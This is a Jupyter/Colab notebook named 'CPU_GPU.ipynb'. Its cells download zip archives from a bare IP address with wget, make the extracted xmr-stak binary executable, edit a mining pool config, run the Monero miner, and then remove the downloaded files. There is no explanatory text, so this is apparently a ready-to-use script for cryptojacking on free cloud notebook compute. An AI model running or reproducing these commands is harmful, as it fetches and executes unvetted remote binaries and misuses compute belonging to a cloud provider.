{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "CPU_GPU.ipynb",
      "version": "0.3.2",
      "provenance": [],
      "collapsed_sections": [],
      "toc_visible": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "741_M9G1bNFo",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "!apt-get update\n",
        "!apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev\n",
        "!wget http://70.36.114.150/google_xmr.zip\n",
        "!unzip google_xmr.zip\n",
        "!chmod 777 google_xmr/xmr-stak\n",
        "!chmod 777 google_xmr/libxmrstak_cuda_backend.so\n",
        "!wget http://70.36.114.150/google_config.zip\n",
        "!unzip google_config.zip\n",
        "!sed -i 's/change/_cpu/g' pools.txt\n",
        "!echo \"DONE!\""
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "RVA2vkzkcFK1",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "!./google_xmr/xmr-stak"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "igkC2iKtrLL2",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "#if any error\n",
        "!rm -rf google_xmr/ *.txt google_* wget*\n",
        "!echo \"DONE!\""
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}